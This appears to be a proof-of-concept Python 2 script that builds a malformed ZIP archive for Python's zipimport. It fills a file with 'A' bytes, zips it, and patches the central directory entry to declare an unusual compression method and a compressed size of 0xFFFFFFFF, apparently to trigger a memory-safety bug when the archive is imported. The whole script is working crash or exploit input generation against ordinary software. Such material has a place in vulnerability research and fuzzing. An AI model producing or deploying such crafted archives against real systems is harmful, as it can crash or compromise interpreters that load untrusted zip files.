import zipimport
import zipfile
import struct
import sys
import os
from signal import *
from conf import *

def p32(x):
    return struct.pack('<I', x)

def up32(x):
    return struct.unpack('<I', x)[0]

def up16(x):
    return struct.unpack('<H', x)[0]

def create_file():
    with open(FILE, 'wb') as f:
        f.write('A' * 2000)

def create_zipfile():
    tmp = "tmp"+ZIP
    zf = zipfile.PyZipFile(tmp, mode='w')
    zf.write(FILE)
    zf.close()

    f = open(tmp, 'rb')
    data = f.read()
    idx = data.index(p32(0x02014B50))
    f.seek(0)

    data = f.read(idx)
    data += f.read(10) # magic & dummy & flags
    data += "\x01\x00" # compress
    f.read(2) # compress

    data += f.read(2 + 2 + 4)
    data += "\xff\xff\xff\xff"
    f.read(4) # data_size
    data += f.read() # remainings

    with open(ZIP, 'wb') as f:
        f.write(data)

    f.close()
    os.unlink(tmp)

if __name__ == '__main__':
    create_file()
    create_zipfile()
